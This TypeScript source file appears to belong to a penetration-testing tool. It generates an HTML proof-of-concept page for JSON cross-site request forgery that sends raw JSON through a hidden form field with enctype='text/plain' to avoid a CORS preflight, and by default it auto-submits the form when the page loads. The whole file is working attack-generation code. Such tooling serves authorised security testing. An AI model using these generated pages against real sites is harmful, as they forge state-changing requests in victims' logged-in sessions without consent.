import { ParsedRequest } from '../../types';
import { PocGeneratorOptions, escapeHtml } from './types';

/**
 * Generates a JSON CSRF PoC using the text/plain form enctype trick.
 * Browsers allow enctype="text/plain" without triggering a CORS preflight OPTIONS check.
 */
export function generateJsonCsrfPoc(
  request: ParsedRequest,
  options: Partial<PocGeneratorOptions> = {}
): string {
  const autoSubmit = options.autoSubmit !== false;
  const targetUrl = request.url;
  const method = request.method.toUpperCase();
  const rawJson = request.body || '{}';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>JSON CSRF PoC (enctype=text/plain)</title>
</head>
<body style="font-family: sans-serif; padding: 40px;">
  <h2>JSON CSRF Exploit (Text/Plain Form Trick)</h2>
  <p>Target: <code>${escapeHtml(targetUrl)}</code></p>
  <p style="font-size: 13px; color: #666;">
    Bypasses CORS preflight by utilizing <code>enctype="text/plain"</code> to transmit raw JSON syntax.
  </p>

  <form id="json_csrf_form" action="${escapeHtml(targetUrl)}" method="${method}" enctype="text/plain">
    <input type="hidden" name='{"dummy":"' value='","payload":${escapeHtml(rawJson)}}' />
    ${
      !autoSubmit
        ? `<button type="submit" style="padding: 10px 20px;">Trigger JSON CSRF</button>`
        : ''
    }
  </form>

  ${
    autoSubmit
      ? `<script>
    window.onload = function() {
      document.getElementById('json_csrf_form').submit();
    };
  </script>`
      : ''
  }
</body>
</html>`;
}
